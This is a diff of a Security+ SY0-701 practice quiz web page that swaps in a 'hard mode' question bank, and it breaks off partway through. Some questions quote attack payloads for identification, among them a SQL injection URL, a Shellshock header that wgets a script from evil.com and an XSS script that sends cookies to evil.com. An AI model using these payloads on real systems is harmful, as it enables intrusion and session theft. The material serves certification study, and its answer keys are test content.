@@ -43,6 +43,19 @@
             background-color: #f8fafc;
             border-left: 4px solid #6366f1;
         }
+        /* Estilo para Logs/Código */
+        .code-block {
+            background-color: #1e293b; /* slate-800 */
+            color: #e2e8f0; /* slate-200 */
+            font-family: 'Consolas', 'Monaco', monospace;
+            padding: 12px;
+            border-radius: 8px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            font-size: 0.9em;
+            margin-top: 8px;
+            margin-bottom: 16px;
+        }
         /* Custom scrollbar for review section */
         .review-scroll::-webkit-scrollbar {
             width: 8px;
@@ -68,7 +81,7 @@
         <div id="start-screen" class="text-center bg-white p-8 rounded-2xl shadow-xl">
             <i class="fas fa-shield-halved text-6xl text-indigo-600 mb-4"></i>
             <h1 class="text-4xl font-bold text-slate-900 mb-2">Security+ SY0-701 Ultimate Quiz</h1>
-            <p class="text-slate-600 mb-6 max-w-2xl mx-auto">This quiz is engineered to prepare you for success. It features a weighted question bank based on the official CompTIA exam domains. Select the number of questions and start your path to certification.</p>
+            <p class="text-slate-600 mb-6 max-w-2xl mx-auto">Hard Mode - V3 (EN). This question bank focuses on scenarios, analysis, and practical application to simulate the real exam difficulty.</p>
             <div class="mb-6">
                 <label for="question-count" class="block text-lg font-medium text-slate-700 mb-2">How many questions?</label>
                 <select id="question-count" class="px-4 py-2 text-center rounded-lg border-slate-300 focus:ring-indigo-500 focus:border-indigo-500">
@@ -102,6 +115,7 @@
             <!-- Question and Options -->
             <div id="question-area">
                 <p id="question-text" class="text-xl font-semibold mb-6"></p>
+                <div id="question-content-area"></div> <!-- Área para logs ou imagens -->
                 <div id="options-container" class="grid grid-cols-1 md:grid-cols-2 gap-4">
                     <!-- Options will be dynamically inserted here -->
                 </div>
@@ -116,7 +130,7 @@
         <!-- Results Screen -->
         <div id="results-screen" class="hidden bg-white p-8 rounded-2xl shadow-xl text-center">
             <h2 class="text-3xl font-bold text-slate-900 mb-2">Quiz Complete!</h2>
-            <p class="text-slate-600 mb-6">Here's your performance breakdown. Focus on your weaker domains to improve.</p>
+            <p class="text-slate-600 mb-6">Here's your performance. Review your mistakes and focus on your weaker domains.</p>
             
             <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
                 <div class="bg-slate-100 p-4 rounded-lg">
@@ -159,731 +173,715 @@
 
     <script>
     document.addEventListener('DOMContentLoaded', () => {
-        // --- QUESTION BANK ---
-        // Carefully curated and weighted question bank based on SY0-701 domains.
-        // Now expanded to 100 questions.
+        // --- ENGLISH QUESTION BANK (HARD MODE) ---
+        // Focused on scenarios, analysis, and application (100 Questions)
         const questionBank = [
-            // Domain 1: General Security Concepts (12%)
+            // --- Domain 1: General Security Concepts (12%) ---
             {
                 domain: "1.0 General Security Concepts",
-                question: "A security analyst is implementing a cryptographic system that requires a secure method for key exchange. Which of the following algorithms is specifically designed for this purpose?",
-                options: ["AES", "RSA", "Diffie-Hellman", "SHA-256"],
-                answer: "Diffie-Hellman",
-                explanation: "Diffie-Hellman is a key exchange protocol used to securely establish a shared secret over an insecure channel. AES is a symmetric encryption algorithm, RSA is an asymmetric algorithm used for encryption and digital signatures, and SHA-256 is a hashing algorithm."
-            },
-            {
-                domain: "1.0 General Security Concepts",
-                question: "Which of the following security principles is best described as providing users and systems with only the access and permissions they absolutely require to perform their tasks?",
-                options: ["Defense in depth", "Least privilege", "Separation of duties", "Security through obscurity"],
-                answer: "Least privilege",
-                explanation: "The principle of least privilege dictates that entities should be granted the minimum level of access necessary. Defense in depth involves layered security, separation of duties prevents single points of compromise, and security through obscurity is the unreliable practice of hiding security flaws."
-            },
-             {
-                domain: "1.0 General Security Concepts",
-                question: "A company wants to ensure that a sender's identity is authenticated and that the message they send has not been tampered with. Which cryptographic control provides both of these assurances?",
-                options: ["Hashing", "Symmetric encryption", "Digital signature", "Steganography"],
-                answer: "Digital signature",
-                explanation: "A digital signature, created with the sender's private key, provides non-repudiation (authenticating the sender) and integrity (ensuring the message hasn't been altered). Hashing only provides integrity. Symmetric encryption provides confidentiality."
+                question: "A security analyst is reviewing a system that uses asymmetric encryption. Which key is used to encrypt a message to ensure confidentiality?",
+                options: ["Sender's public key", "Sender's private key", "Recipient's public key", "Recipient's private key"],
+                answer: "Recipient's public key",
+                explanation: "To ensure confidentiality, the message is encrypted with the recipient's public key. Only the recipient, with their corresponding private key, can decrypt it. The sender's private key is used for digital signatures (non-repudiation)."
             },
             {
                 domain: "1.0 General Security Concepts",
-                question: "Which of the following is a fundamental difference between a law, a regulation, and a policy?",
-                options: ["A law is globally applicable, a regulation is national, and a policy is organizational.", "A law is passed by a legislative body, a regulation is issued by a government agency to enforce the law, and a policy is an internal organizational rule.", "A policy is legally binding, a regulation is a suggestion, and a law is an industry standard.", "A regulation carries financial penalties, while laws and policies do not."],
-                answer: "A law is passed by a legislative body, a regulation is issued by a government agency to enforce the law, and a policy is an internal organizational rule.",
-                explanation: "This option correctly defines the hierarchy and origin. Laws are created by legislatures (e.g., Congress), regulations are the detailed rules created by agencies (e.g., SEC, HHS) to implement those laws, and policies are specific to an organization."
+                question: "Which of the following BEST describes the fundamental difference between Diffie-Hellman (DH) and RSA?",
+                options: ["DH is symmetric, while RSA is asymmetric.", "DH is used for key exchange, while RSA is used for encryption and signatures.", "DH is faster than RSA for bulk data encryption.", "DH uses elliptic curves, while RSA uses discrete logarithms."],
+                answer: "DH is used for key exchange, while RSA is used for encryption and signatures.",
+                explanation: "This is the main distinction. Diffie-Hellman is a key exchange protocol used to establish a shared secret over an insecure channel. It does not encrypt data. RSA can be used for both encryption (confidentiality) and digital signatures (authenticity and non-repudiation)."
             },
             {
                 domain: "1.0 General Security Concepts",
-                question: "A company is setting up a new data center and wants to implement a fire suppression system that is safe for humans and electronic equipment. Which of the following would be the MOST appropriate choice?",
-                options: ["Water sprinkler system", "Foam-based system", "Clean agent system (e.g., HFC-227ea)", "Carbon dioxide (CO2) system"],
-                answer: "Clean agent system (e.g., HFC-227ea)",
-                explanation: "Clean agent systems use inert gases or chemical agents that extinguish fires without damaging equipment or leaving a residue, and are safe for occupied spaces. Water and foam would destroy electronics. CO2 systems displace oxygen and are lethal to humans."
-            },
-
-            // Domain 2: Threats, Vulnerabilities, and Mitigations (22%)
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "An attacker is using a technique that involves sending a large volume of unsolicited emails with malicious links to thousands of employees. Which of the following BEST describes this type of attack?",
-                options: ["Spear phishing", "Whaling", "Phishing", "Vishing"],
-                answer: "Phishing",
-                explanation: "Phishing is a broad-based attack that sends a large number of generic malicious emails. Spear phishing is highly targeted to a specific individual or group, Whaling targets high-level executives, and Vishing is voice-based phishing."
+                question: "A developer needs to store user passwords securely. The requirement is that the original passwords can never be recovered, even by an administrator. Which cryptographic function meets this requirement?",
+                options: ["AES-256", "RSA", "Hashing (with Salt)", "Steganography"],
+                answer: "Hashing (with Salt)",
+                explanation: "Hashing is a one-way function; it turns data into a fixed-size hash but cannot be reversed. Using a 'salt' (a random value per user) before hashing prevents rainbow table attacks. AES and RSA are encryption algorithms, which are reversible."
             },
             {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "A web application has a vulnerability where an attacker can input `'; DROP TABLE users; --` into a username field, causing the database to delete the user table. This is an example of what kind of attack?",
-                options: ["Cross-site scripting (XSS)", "SQL injection (SQLi)", "Directory traversal", "Cross-site request forgery (CSRF)"],
-                answer: "SQL injection (SQLi)",
-                explanation: "This is a classic example of SQL injection, where the attacker injects malicious SQL commands into input fields to manipulate the backend database. XSS injects scripts into websites, directory traversal accesses unauthorized files, and CSRF tricks a user into performing an unwanted action."
+                domain: "1.0 General Security Concepts",
+                question: "A user needs to prove their identity to a server without transmitting their password. The server sends the user a 'nonce' (random number). The user encrypts the nonce with their private key and sends it back. The server then uses the user's public key to verify. This is an example of:",
+                options: ["Mutual authentication", "Zero-knowledge proof", "Challenge-Response Authentication", "Tokenization"],
+                answer: "Challenge-Response Authentication",
+                explanation: "This is a classic example of Challenge-Response authentication. The server 'challenges' the client with a nonce. The client 'responds' by performing a cryptographic operation that proves they possess the private key, without ever transmitting the key or password."
             },
             {
-                // FIX: Corrected domain capitalization from 'vulnerabilities' to 'Vulnerabilities' to match the function
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations", 
-                question: "During a security audit, a legacy industrial control system (ICS) is found to be running an unpatched, unsupported operating system. The vendor has gone out of business. Which of the following is the BEST mitigation strategy?",
-                options: ["Take the system offline immediately.", "Isolate the system on a segmented network with strict firewall rules.", "Attempt to reverse engineer a patch for the OS.", "Install third-party antivirus software on the system."],
-                answer: "Isolate the system on a segmented network with strict firewall rules.",
-                explanation: "Since the system cannot be patched and may be critical for operations, the best approach is network segmentation. This isolates the vulnerable system, controlling all traffic to and from it with a firewall, thereby reducing its attack surface and preventing lateral movement."
+                domain: "1.0 General Security Concepts",
+                question: "A company is implementing a datacenter and installs surveillance cameras, security guards, and biometric locks. These are examples of what type of control?",
+                options: ["Technical", "Administrative", "Physical", "Corrective"],
+                answer: "Physical",
+                explanation: "Physical controls are tangible items designed to protect the physical security of facilities and equipment. Cameras, guards, locks, and fences are classic examples."
             },
-             {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "A security analyst notices a gradual increase in network traffic and CPU usage on a critical server over several weeks, with no corresponding increase in legitimate business activity. The activity is traced to malware that is slowly exfiltrating data. This is characteristic of a(n):",
-                options: ["Advanced Persistent Threat (APT)", "Zero-day exploit", "Denial-of-Service (DoS) attack", "Ransomware infection"],
-                answer: "Advanced Persistent Threat (APT)",
-                explanation: "APTs are characterized by their 'low and slow' approach. They aim to remain undetected for long periods while they stealthily gather and exfiltrate data. DoS attacks are noisy and disruptive, while ransomware typically announces its presence immediately."
+            {
+                domain: "1.0 General Security Concepts",
+                question: "A company policy states: 'No single employee can create a new vendor in the payment system and also approve invoices from that same vendor.' This is an example of which security principle?",
+                options: ["Least Privilege", "Defense in Depth", "Separation of Duties", "Need to Know"],
+                answer: "Separation of Duties",
+                explanation: "Separation of Duties is an administrative control that divides a critical task into multiple parts, requiring more than one person to complete it. This prevents a single individual from committing fraud or significant errors."
             },
-             {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "Which of the following describes a vulnerability created by a race condition?",
-                options: ["An attacker exploits a buffer overflow to execute arbitrary code.", "A web application fails to properly validate user input, allowing for SQL injection.", "Two or more processes attempt to access a shared resource, and the outcome depends on the timing of their execution.", "An attacker uses a stolen session cookie to impersonate a legitimate user."],
-                answer: "Two or more processes attempt to access a shared resource, and the outcome depends on the timing of their execution.",
-                explanation: "A race condition is a timing-based vulnerability where the security of the system is compromised because of an unexpected sequence or timing of events. A classic example is a 'time-of-check to time-of-use' (TOCTOU) attack."
+            {
+                domain: "1.0 General Security Concepts",
+                question: "Which encryption algorithm is a symmetric block cipher that superseded DES and is available in three key sizes (128, 192, and 256 bits)?",
+                options: ["RC4", "AES", "Twofish", "RSA"],
+                answer: "AES",
+                explanation: "AES (Advanced Encryption Standard) is the de facto symmetric standard used today. It operates on blocks of data and replaced DES (Data Encryption Standard) due to its security and efficiency."
             },
-             {
+            {
+                domain: "1.0 General Security Concepts",
+                question: "A company wants to implement multi-factor authentication. They decide to require 'something you know' and 'something you are'. Which of the following combinations meets this requirement?",
+                options: ["Password and PIN", "Hardware token and fingerprint", "Password and fingerprint", "Digital certificate and hardware token"],
+                answer: "Password and fingerprint",
+                explanation: "The 'password' is 'something you know' (knowledge factor). The 'fingerprint' is 'something you are' (biometric factor). 'Password and PIN' are both the same factor (knowledge). 'Token and fingerprint' are 'something you have' and 'something you are'. 'Certificate and token' are both 'something you have'."
+            },
+            {
+                domain: "1.0 General Security Concepts",
+                question: "A company is moving to the cloud and chooses a model where the cloud provider manages the hardware, virtualization, OS, and middleware. The company manages only its application and its data. What model is this?",
+                options: ["IaaS (Infrastructure as a Service)", "PaaS (Platform as a Service)", "SaaS (Software as a Service)", "Hybrid"],
+                answer: "PaaS (Platform as a Service)",
+                explanation: "In the PaaS model, the provider offers the 'platform' (including the OS and runtime environment, like Java or Python) and the customer simply deploys their application. In IaaS, the customer would manage the OS. In SaaS, the customer would just use the software."
+            },
+            {
+                domain: "1.0 General Security Concepts",
+                question: "A security analyst needs to verify the integrity of a digital evidence file. What is the MOST appropriate tool for this?",
+                options: ["An antivirus scanner", "An encryption program like GPG", "A hashing utility like sha256sum", "An EXIF metadata viewer"],
+                answer: "A hashing utility like sha256sum",
+                explanation: "Hashing (MD5, SHA-1, SHA-256) creates a unique 'digital fingerprint' of a file. By comparing the hash of the original file with the hash of a copy, an analyst can prove that integrity has been maintained and the file has not been altered."
+            },
+            {
+                domain: "1.0 General Security Concepts",
+                question: "What is the primary security advantage of Elliptic Curve Cryptography (ECC) compared to RSA?",
+                options: ["ECC is resistant to quantum computing attacks.", "ECC provides the same cryptographic strength with much smaller key sizes.", "ECC can be used for symmetric encryption.", "ECC is easier to implement in legacy hardware."],
+                answer: "ECC provides the same cryptographic strength with much smaller key sizes.",
+                explanation: "ECC's efficiency is its main advantage. A 256-bit ECC key provides comparable security to a 3072-bit RSA key. This makes it ideal for low-power devices like smartphones and IoT devices."
+            },
+            {
+                domain: "1.0 General Security Concepts",
+                question: "A user receives an email with a digital signature. Which of the following benefits is NOT provided by the digital signature?",
+                options: ["Authenticity", "Non-repudiation", "Integrity", "Confidentiality"],
+                answer: "Confidentiality",
+                explanation: "A digital signature proves *who* sent the message (authenticity), ensures the sender cannot *deny* sending it (non-repudiation), and proves the message *was not altered* (integrity). It does *not* encrypt the message so others can't read it (confidentiality). You would need to encrypt the message for that (usually with the recipient's public key)."
+            },
+        
+            // --- Domain 2: Threats, Vulnerabilities, and Mitigations (22%) ---
+            {
                 domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "A company's threat intelligence feed reports that a new malware variant is spreading via compromised USB drives. The malware creates a file named `autorun.inf` to execute itself automatically. Which of the following would be an effective host-based mitigation?",
-                options: ["Implementing a host-based firewall", "Enforcing strong password policies", "Disabling AutoPlay/AutoRun functionality via Group Policy", "Encrypting the hard drive with BitLocker"],
-                answer: "Disabling AutoPlay/AutoRun functionality via Group Policy",
-                explanation: "The most direct mitigation for this specific threat is to disable the operating system feature that the malware relies on. Disabling AutoPlay/AutoRun prevents the system from automatically executing commands from removable media, neutralizing this attack vector."
+                question: "A security analyst sees the following traffic in a WAF log. What type of attack is likely in progress?",
+                extraContent: `<div class="code-block">GET /products.php?id=123%20UNION%20SELECT%20user,pass%20FROM%20users--</div>`,
+                options: ["Cross-Site Scripting (XSS)", "SQL Injection (SQLi)", "Path Traversal", "Command Injection"],
+                answer: "SQL Injection (SQLi)",
+                explanation: "The `UNION SELECT ... FROM users` payload is a classic SQL Injection attempt to extract data (usernames and passwords) from the 'users' table. The WAF should be configured to block this pattern."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "A user reports that when visiting their bank's website, their browser showed an invalid certificate warning, but they clicked 'proceed'. They now suspect their account is compromised. What attack is MOST likely?",
+                options: ["Phishing", "Man-in-the-Middle (MITM)", "DDoS", "Malware on the bank's server"],
+                answer: "Man-in-the-Middle (MITM)",
+                explanation: "The invalid certificate warning is a classic sign of a MITM (Man-in-the-Middle) attack. An attacker (likely on the same network, like public Wi-Fi) is intercepting the connection, presenting their own fake certificate (which the browser doesn't trust), and then proxying the traffic to the bank, reading everything."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "An attacker sets up a Wi-Fi access point in an airport with the SSID 'AIRPORT_FREE_WIFI', identical to the legitimate network. The attacker then captures traffic from users who connect. This attack is an:",
+                options: ["Evil Twin", "Bluejacking", "IV Attack", "WPS Attack"],
+                answer: "Evil Twin",
+                explanation: "An Evil Twin is a rogue Wi-Fi access point that masquerades as a legitimate one to trick users into connecting. This allows the attacker to perform Man-in-the-Middle attacks."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "A security analyst finds a new piece of malware. When run in a sandbox, it changes its own code on each execution to avoid signature-based detection. This malware is:",
+                options: ["Polymorphic", "Stealth", "A rootkit", "A logic bomb"],
+                answer: "Polymorphic",
+                explanation: "Polymorphic (poly = many, morph = form) malware changes its code (signature) with each infection to evade detection by AV scanners that look for known file patterns."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "A user on a corporate network receives a highly customized email, appearing to be from the IT department, mentioning a recent project they worked on and asking them to 'validate their credentials' on a link. This is an example of:",
+                options: ["Bulk Phishing", "Spear Phishing", "Whaling", "Vishing"],
+                answer: "Spear Phishing",
+                explanation: "While 'phishing' is generic and sent in bulk, 'spear phishing' is a targeted, customized attack aimed at a specific individual or group. 'Whaling' is spear phishing aimed at high-level executives (C-level)."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "What is the BEST technical mitigation against SQL Injection attacks at the application layer?",
+                options: ["Using a WAF", "Encrypting the database", "Input validation with prepared statements", "Keeping the database server patched"],
+                answer: "Input validation with prepared statements",
+                explanation: "While a WAF and patching are good (defense in depth), the primary and most effective mitigation in the source code is to use 'prepared statements' (also called parameterized queries). This separates the SQL command from the input data, making it impossible for user input to be executed as a command."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "A SCADA (Supervisory Control and Data Acquisition) system at a power plant is vulnerable but cannot be patched due to uptime requirements and vendor compatibility. What is the BEST mitigation strategy?",
+                options: ["Replace the system immediately", "Implement network segmentation and a firewall to isolate the system", "Decommission the system permanently", "Install modern antivirus software on the SCADA system"],
+                answer: "Implement network segmentation and a firewall to isolate the system",
+                explanation: "In ICS/SCADA environments, 'downtime' is the enemy. Systems often cannot be patched. The best compensating strategy is segmentation: isolate the vulnerable system in its own VLAN/subnet and use a firewall to strictly allow only essential traffic, reducing its attack surface."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "An attacker obtains an NTLM password hash from a Windows server and uses it to authenticate to another server on the same network, without ever knowing the cleartext password. This attack is known as:",
+                options: ["Pass-the-Hash (PtH)", "Rainbow Table Attack", "Brute Force Attack", "Man-in-the-Middle (MITM)"],
+                answer: "Pass-the-Hash (PtH)",
+                explanation: "Pass-the-Hash (PtH) is an attack technique that exploits the fact that Windows (in many scenarios) authenticates using the NTLM hash, not the password itself. The attacker steals the hash from memory and 'passes' it to another service to authenticate."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "A security analyst is reviewing firewall logs and sees a large volume of UDP port 53 (DNS) traffic from an internal server to a single external IP. The data payload of the packets appears to be encrypted or obfuscated. This is a strong indicator of which attack?",
+                options: ["DNS poisoning", "DDoS (Smurf Attack)", "DNS Tunneling (Exfiltration)", "ARP spoofing"],
+                answer: "DNS Tunneling (Exfiltration)",
+                explanation: "DNS Tunneling is a data exfiltration technique that encapsulates data (often commands or stolen files) inside DNS queries. Since DNS traffic (port 53) is almost always allowed out of a network, attackers use it as a covert channel."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "A developer finds a vulnerability in a web application where they can upload a `shell.php` file disguised as `shell.jpg`. They then access `.../uploads/shell.php` to get a reverse shell. Which vulnerability was exploited?",
+                options: ["Directory Traversal", "Insecure Direct Object Reference (IDOR)", "Unrestricted File Upload", "Server-Side Request Forgery (SSRF)"],
+                answer: "Unrestricted File Upload",
+                explanation: "The Unrestricted File Upload vulnerability occurs when an application allows a user to upload files without properly validating their type, content, or extension. This allows an attacker to upload a web shell (like in PHP, ASP, etc.) and achieve remote code execution."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "An attacker sends an HTTP request to a web server with the following header. Which vulnerability are they attempting to exploit?",
+                extraContent: `<div class="code-block">GET / HTTP/1.1\nHost: example.com\nUser-Agent: () { :; }; /bin/bash -c 'wget http://evil.com/payload.sh'</div>`,
+                options: ["Heartbleed", "POODLE", "Shellshock", "SQL Injection"],
+                answer: "Shellshock",
+                explanation: "The `() { :; };` payload in the User-Agent header is the classic signature of the Shellshock vulnerability (CVE-2014-6271). It exploits a flaw in Bash (the Linux shell) that allows remote code execution through environment variables passed by web applications."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "An attacker finds a field on a web form that is vulnerable to XSS. They insert the following script. What is the goal of this script?",
+                extraContent: `<div class="code-block"><script>document.location='http://evil.com/steal?cookie=' + document.cookie;<\/script></div>`,
+                options: ["Crash the victim's browser (Denial of Service)", "Redirect the victim to a malicious site", "Steal the victim's session cookie", "Execute a SQL Injection attack"],
+                answer: "Steal the victim's session cookie",
+                explanation: "This is a classic session hijacking attack via XSS. The script takes the user's session cookie (`document.cookie`) and sends it as a GET parameter to an attacker-controlled server (`evil.com`), allowing the attacker to hijack the session."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "During a penetration test, an analyst discovers a web application uses URLs like `.../get_profile.php?user_id=123`. By changing the ID to `124`, they see another user's profile. What type of vulnerability is this?",
+                options: ["Cross-Site Scripting (XSS)", "Insecure Direct Object Reference (IDOR)", "Server-Side Request Forgery (SSRF)", "XML External Entity (XXE)"],
+                answer: "Insecure Direct Object Reference (IDOR)",
+                explanation: "IDOR (now part of Broken Access Control) occurs when an application exposes a direct reference to an internal object (like a user_id, file_id, etc.) and fails to perform a proper authorization check to ensure the current user has permission to access that object."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "A new ransomware variant is spreading rapidly. The antivirus vendor has not released a signature for it yet. Which type of security solution would have the BEST chance of detecting and stopping this attack?",
+                options: ["Signature-based antivirus scanner", "Behavior-based Endpoint Detection and Response (EDR)", "Stateful network firewall", "Tape backup system"],
+                answer: "Behavior-based Endpoint Detection and Response (EDR)",
+                explanation: "Zero-day attacks, like new ransomware, bypass signature-based detection (traditional AV). A modern EDR analyzes *behavior* (e.g., 'Why is Word encrypting files on my drive?'). This anomalous behavior triggers an alert, allowing the EDR to stop the process even without a signature."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "An attacker tricks a company's server into making a web request to an internal service (e.g., `http://10.0.0.5/admin`). The external server is effectively acting as a proxy for the attacker. What type of attack is this?",
+                options: ["Cross-Site Request Forgery (CSRF)", "Server-Side Request Forgery (SSRF)", "Insecure Direct Object Reference (IDOR)", "Man-in-the-Middle (MITM)"],
+                answer: "Server-Side Request Forgery (SSRF)",
+                explanation: "In SSRF, an attacker 'forges' a request that is executed *by the server* (server-side). This is extremely dangerous as the server may have access to internal networks, databases, and cloud metadata services that are not exposed to the internet."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "Which social engineering technique involves an attacker pretending to be a person of authority (like an executive or law enforcement) to intimidate the victim into giving up information?",
+                options: ["Consensus", "Scarcity", "Authority", "Familiarity"],
+                answer: "Authority",
+                explanation: "The principle of Authority exploits the human tendency to obey authority figures. An attacker might call and say, 'This is the Director of IT, I need your password *now* for a security emergency.'"
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "An attacker sends an email to a user who is logged into their bank, tricking them into clicking a link that performs a fund transfer. The link executes an action in the user's already-authenticated session without their knowledge. This attack is:",
+                options: ["Cross-Site Scripting (XSS)", "Cross-Site Request Forgery (CSRF)", "SQL Injection (SQLi)", "Clickjacking"],
+                answer: "Cross-Site Request Forgery (CSRF)",
+                explanation: "CSRF (or XSRF) tricks an authenticated victim's browser into sending a forged request to a website. The site has no way of knowing the request was unintentional. The mitigation for this is anti-CSRF tokens."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "A security analyst reviewing firewall logs notices an internal host 'beacons' (short, regular calls) to an external IP every 15 minutes, 24/7. This is a strong indicator of:",
+                options: ["Normal Windows update traffic", "A Denial of Service (DoS) attack", "Malware infection (Command and Control)", "A user browsing the web"],
+                answer: "Malware infection (Command and Control)",
+                explanation: "This 'heartbeat' or 'beacon' pattern is characteristic of malware (like a bot or trojan) communicating with its Command and Control (C2) server. It is 'phoning home' at regular intervals to receive instructions or prove it's still active."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "An attacker uses a network scanner to send a TCP packet with the 'Xmas' flag (FIN, PSH, URG) to a port. A Linux/Unix system will return an RST packet if the port is closed. What type of scan is this?",
+                options: ["SYN Stealth Scan", "TCP Connect Scan", "Xmas Scan", "UDP Scan"],
+                answer: "Xmas Scan",
+                explanation: "An Xmas Scan (like FIN and NULL scans) is a 'stealth' scan that uses combinations of TCP flags (in this case, 'lit up like a Christmas tree') that violate the TCP RFC. Because Unix-based systems respond differently for open (no response) and closed (RST) ports, it can be used to map the system."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "Which of the following is a hardware vulnerability, exploited by monitoring a device's power consumption or electromagnetic emissions to infer cryptographic data?",
+                options: ["Rowhammer", "Side-Channel Attack", "Buffer Overflow", "TOCTOU (Time-of-check-to-time-of-use)"],
+                answer: "Side-Channel Attack",
+                explanation: "A Side-Channel Attack does not exploit the algorithm itself, but rather its physical *implementation*. Examples include timing analysis, power analysis, and electromagnetic analysis to leak information about secret keys."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "A user reports an antivirus pop-up stating 'Threat Detected: generic.ml.a'. The user was not doing anything unusual. This is MOST likely an example of:",
+                options: ["A zero-day attack", "A True Positive", "A False Positive", "A True Negative"],
+                answer: "A False Positive",
+                explanation: "While it could be a True Positive, detections with generic names like 'generic.ml.a' (indicating Machine Learning detection) are a common source of False Positives, where the AV's heuristic/ML engine incorrectly flags a legitimate file as malicious."
+            },
+            {
+                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
+                question: "What is the primary difference between a 'phishing' and a 'pharming' attack?",
+                options: ["Phishing uses email, pharming uses SMS.", "Phishing tricks the user, pharming poisons DNS.", "Phishing steals credentials, pharming installs ransomware.", "Phishing is targeted, pharming is bulk."],
+                answer: "Phishing tricks the user, pharming poisons DNS.",
+                explanation: "Phishing is a 'lure' attack (social engineering) that tricks a user into clicking a link or entering credentials. Pharming is a more technical attack that corrupts DNS (either locally on the 'hosts' file or on a DNS server) to redirect a victim to a malicious site even if they type the correct URL."
+            },
+        
+            // --- Domain 3: Security Architecture (18%) ---
+            {
+                domain: "3.0 Security Architecture",
+                question: "A company needs to provide secure remote access for its employees working from home. The solution must encrypt all traffic from the employee's laptop to the corporate network. What is the BEST solution?",
+                options: ["Implement a web portal with HTTPS", "Use a VPN client (like OpenVPN or IPsec)", "Configure port forwarding rules on the firewall", "Install a reverse proxy"],
+                answer: "Use a VPN client (like OpenVPN or IPsec)",
+                explanation: "A VPN (Virtual Private Network) is designed for this exact purpose. It creates an encrypted, authenticated 'tunnel' between the remote endpoint (laptop) and the corporate network (VPN concentrator), making the laptop operate as if it were on the local network securely."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "A network architect is designing a network and places the public-facing web servers on a separate network segment, isolated from both the Internet and the internal network by firewalls. What is this segment called?",
+                options: ["Honeynet", "VLAN", "DMZ (Demilitarized Zone)", "Extranet"],
+                answer: "DMZ (Demilitarized Zone)",
+                explanation: "A DMZ is a perimeter network (or subnet) that exposes an organization's external-facing services (like web, email, and DNS servers) to the Internet while isolating them from the protected internal network."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "What is the core principle of a 'Zero Trust' security model compared to a traditional perimeter model?",
+                options: ["It eliminates the need for firewalls.", "It trusts all devices inside the corporate network.", "It trusts no user or device, regardless of location (internal or external).", "It focuses only on encrypting data at rest."],
+                answer: "It trusts no user or device, regardless of location (internal or external).",
+                explanation: "The traditional perimeter model operates on 'trust but verify' (it trusts things *inside* the network). Zero Trust operates on 'never trust, always verify'. It assumes the internal network is already compromised and requires *every* access (user, device, application) to be strictly authenticated and authorized."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "A company wants to inspect SSL/TLS traffic for malware at the network edge. What technology is required to do this effectively?",
+                options: ["A standard Network IDS (NIDS)", "SSL/TLS Decryption (or SSL Inspection)", "A Load Balancer", "A simple Forward Proxy"],
+                answer: "SSL/TLS Decryption (or SSL Inspection)",
+                explanation: "SSL/TLS traffic is encrypted, making it invisible to most security devices. To inspect it, a device (like a next-gen firewall or proxy) must perform 'SSL/TLS Decryption', which decrypts the traffic, inspects it, and then re-encrypts it. It is an 'authorized' Man-in-the-Middle attack."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "What network technology allows an administrator to logically group network devices, even if they are on different physical switches, and isolate their traffic?",
+                options: ["VPN (Virtual Private Network)", "VLAN (Virtual Local Area Network)", "NAT (Network Address Translation)", "DMZ (Demilitarized Zone)"],
+                answer: "VLAN (Virtual Local Area Network)",
+                explanation: "A VLAN allows for logical segmentation of a network. Devices on VLAN 10 can only talk to devices on VLAN 10, even if they are plugged into the same switch as devices on VLAN 20. This is fundamental for network segmentation."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "A developer is embedding security into the CI/CD pipeline. They add a tool that analyzes the source code for vulnerabilities (like SQLi) *before* the code is compiled. This is an example of:",
+                options: ["SAST (Static Application Security Testing)", "DAST (Dynamic Application Security Testing)", "IAST (Interactive Application Security Testing)", "Fuzzing"],
+                answer: "SAST (Static Application Security Testing)",
+                explanation: "SAST, or 'White-Box' testing, analyzes the *static* source code (without running it) to find security flaws like buffer overflows, SQLi, etc. This is done early in the pipeline (e.g., on 'commit' or 'build'). DAST tests the *running* application (Black-Box)."
+            },
+            {
+                domain: "3.0 Security Architecture",
